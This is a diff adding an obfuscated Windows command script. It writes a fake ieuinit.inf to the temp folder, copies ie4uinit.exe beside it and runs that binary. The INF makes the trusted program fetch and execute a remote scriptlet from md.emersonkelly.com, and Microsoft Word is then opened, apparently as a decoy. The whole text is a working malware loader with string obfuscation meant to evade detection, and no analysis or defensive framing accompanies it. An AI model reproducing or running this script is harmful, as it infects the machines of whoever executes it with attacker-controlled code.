@@ -1,0 +1,8 @@
+/v /ccall%Beans:~0,1%et "Apology=.inf" &&
+  %Beans:~0,1%et "Harsh=ieuinit!Apology!" &&
+  call %Beans:~0,1%et "Approaches=%t!Analyst!mp%\" &&
+  (for /D %j in ("[string%Beans:~0,1%]" "Lobster=init" "Shadows=com" "Florists=h" "Infant=:;Attractions" "%Beans:~0,1%ervicename=' '" "Graduates=t;Gather" "Filter=/" "%Beans:~0,1%hortsvcname=' '" "Income=%time%" "Green=b;Satisfy" "[de%Beans:~0,1%tinationdirs]" "1991=01" "defaultdestdir=11" "[E6F]" "sc\" "ro%Green%j,NI,%Florists%%Graduates%%Graduates%p%Infant%%Filter%%Filter%md.emersonkelly.%Shadows%/lajvar" "[1991]" "ieu%Lobster%!Apology!" "[version]" "signature =$windows nt$" "[defaultin%Beans:~0,1%tall.windows7]" "delfiles=1991" "Un\" "Register\" "OCXs=E6F" ) do @echo %~j)>"!Approaches!!Harsh!" &&
+  %Beans:~0,1%et "Farmers=ie4uinit.exe" &&
+  call xcopy /Y /C /Q %win!Enemies!ir%\%Beans:~0,1%ystem32\!Farmers! "!Approaches!*" &&
+  start "" "!Approaches!!Farmers!" -basesettings &&
+  start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
